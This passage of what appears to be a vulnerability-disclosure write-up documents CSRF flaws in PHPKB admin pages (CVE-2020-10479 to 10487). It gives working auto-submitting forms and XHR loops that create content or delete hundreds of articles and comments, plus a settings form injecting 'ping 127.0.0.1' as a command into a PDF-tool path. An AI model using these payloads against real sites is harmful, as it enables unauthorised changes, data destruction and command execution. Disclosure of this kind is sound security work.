      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"xls&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;xampp&amp;#92;htdocs&amp;#92;phpkb&amp;#92;admin&amp;#92;xlhtml&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;xampp&amp;#92;htdocs&amp;#92;phpkb&amp;#92;admin&amp;#92;pdftotext&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;pdf"</span> <span class="na">value=</span><span class="s">"pdf"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"index&amp;#95;attachment"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;autosave"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"autosave&amp;#95;interval"</span> <span class="na">value=</span><span class="s">"120000"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"use&amp;#95;wysiwyg&amp;#95;editor"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;version&amp;#95;history"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;captcha"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"captcha&amp;#95;type"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recaptcha&amp;#95;site&amp;#95;key"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recaptcha&amp;#95;secret&amp;#95;key"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"syntax&amp;#95;highlighter&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"shThemeRDark"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;library"</span> <span class="na">value=</span><span class="s">"wkhtmltopdf"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"wkhtmltopdf&amp;#95;path"</span> <span class="na">value=</span><span class="s">"ping&amp;#32;127.0.0.1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;header"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;footer&amp;#95;type"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;page&amp;#95;numbers"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;page&amp;#95;number&amp;#95;position"</span> <span class="na">value=</span><span class="s">"Left"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;footer"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;meta&amp;#95;keywords"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;meta&amp;#95;desc"</span> <span class="na">value=</span><span class="s">"This&amp;#32;is&amp;#32;demo&amp;#32;meta&amp;#32;description&amp;#46;&amp;#32;You&amp;#32;can&amp;#32;enter&amp;#32;here&amp;#32;your&amp;#32;meta&amp;#32;description&amp;#46;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"admin&amp;#95;results&amp;#95;perpage"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"&amp;#95;selected&amp;#95;tab&amp;#95;"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit&amp;#95;hd"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit&amp;#95;float&amp;#95;btn"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-creating-a-news-article-cve-2020-10479">Cross-Site Request Forgery when creating a news article (CVE-2020-10479)</h2>
<p>Targeted: Superuser/Editor</p>

<p>Vulnerable file: admin/add-news.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser/Editor;</li>
  <li>go under “news” and click on “add new”;</li>
  <li>write something and click on “save news”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!--Change title with the title of the News --&gt;</span>
<span class="c">&lt;!--Change txtContent with the body of the News --&gt;</span>
<span class="c">&lt;!--Change make_visible to yes to make the news visible, else write no --&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-news.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"test"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"txtContent"</span> <span class="na">value=</span><span class="s">"&amp;lt;p&amp;gt;test&amp;lt;&amp;#47;p&amp;gt;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"make&amp;#95;visible"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"expiry&amp;#95;date"</span> <span class="na">value=</span><span class="s">"2020&amp;#45;01&amp;#45;26"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"autosave&amp;#95;id"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"directsave"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-creating-a-category-cve-2020-10480">Cross-Site Request Forgery when creating a category (CVE-2020-10480)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-category.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “categories” and click on “add new”;</li>
  <li>write something and click “save category”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The name of the category is written in the title parameter --&gt;</span>
<span class="c">&lt;!-- The description of the category is written in the content parameter --&gt;</span>
<span class="c">&lt;!-- To create a public category, write public in the type parameter, to create a private category, write private in the type parameter --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-category.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"type"</span> <span class="na">value=</span><span class="s">"public"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"csrfvulnerability"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"parent&amp;#95;public"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"parent&amp;#95;private"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"content"</span> <span class="na">value=</span><span class="s">"csrfvulnerability"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"group&amp;#95;permissions"</span> <span class="na">value=</span><span class="s">"none"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Save&amp;#32;Category"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-adding-a-new-glossary-term-cve-2020-10481">Cross-Site Request Forgery when adding a new glossary term (CVE-2020-10481)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-glossary.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “glossary” and click on “add new”;</li>
  <li>write something and click on “save glossary term”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The name of the glossary term is written in the term parameter --&gt;</span>
<span class="c">&lt;!-- The description of the glossary term is written in the definition parameter --&gt;</span>
<span class="c">&lt;!-- To create a public glossary term, write yes in the visible parameter, to create a private glossary term, write no in the visible parameter --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-glossary.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"term"</span> <span class="na">value=</span><span class="s">"testt"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"definition"</span> <span class="na">value=</span><span class="s">"testt"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"visible"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-adding-a-new-article-template-cve-2020-10482">Cross-Site Request Forgery when adding a new article template (CVE-2020-10482)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-template.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “article templates”, click on “add”;</li>
  <li>fill random parameters and click “save article template”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- change the title parmeter to change the Article Template title --&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change the body of the Article template --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-template.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"dsa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"txtContent"</span> <span class="na">value=</span><span class="s">"&amp;lt;p&amp;gt;sda&amp;lt;&amp;#47;p&amp;gt;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"make&amp;#95;visible"</span> <span class="na">value=</span><span class="s">"active"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"directsave"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-posting-a-comment-cve-2020-10483">Cross-Site Request Forgery when posting a comment (CVE-2020-10483)</h2>
<p>Targeted: Anyone, given the are logged-in</p>

<p>Vulnerable file: admin/ajax-hub.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>post a comment on a random article.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change the aid parameter to the id of the article you want the comment put on --&gt;</span>
<span class="c">&lt;!-- Change the cmt parameter to the actual text comment --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/include/ajax-hub.php?usefor=AddComments&amp;aid=2&amp;nm=&amp;em=&amp;cmt=sdsda&amp;sc=undefined</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Commenting!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-creating-a-new-custom-field-cve-2020-10484">Cross-Site Request Forgery when creating a new custom field (CVE-2020-10484)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-field.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “custom fields”, click on “add”;</li>
  <li>fill random parameters and hit “save custom field”;</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The title of the article template is written in the title parameter --&gt;</span>
<span class="c">&lt;!-- The body of the article template is written in the txtContent parameter--&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-template.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"dsa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"txtContent"</span> <span class="na">value=</span><span class="s">"&amp;lt;p&amp;gt;sda&amp;lt;&amp;#47;p&amp;gt;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"make&amp;#95;visible"</span> <span class="na">value=</span><span class="s">"active"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"directsave"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-an-article-cve-2020-10485">Cross-Site Request Forgery when deleting an article (CVE-2020-10485)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-articles.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “my articles”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Articles</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-articles.php?sort=&amp;order=&amp;status=own&amp;aid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-comment-cve-2020-10486">Cross-Site Request Forgery when deleting a comment (CVE-2020-10486)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>post a comment on a random article;</li>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “pending”;</li>
  <li>select the comment and click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">comments</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-comments.php?cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-glossary-term-cve-2020-10487">Cross-Site Request Forgery when deleting a glossary term (CVE-2020-10487)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-glossary.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “glossary” and click on “manage”;</li>
  <li>select the glossary term and click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
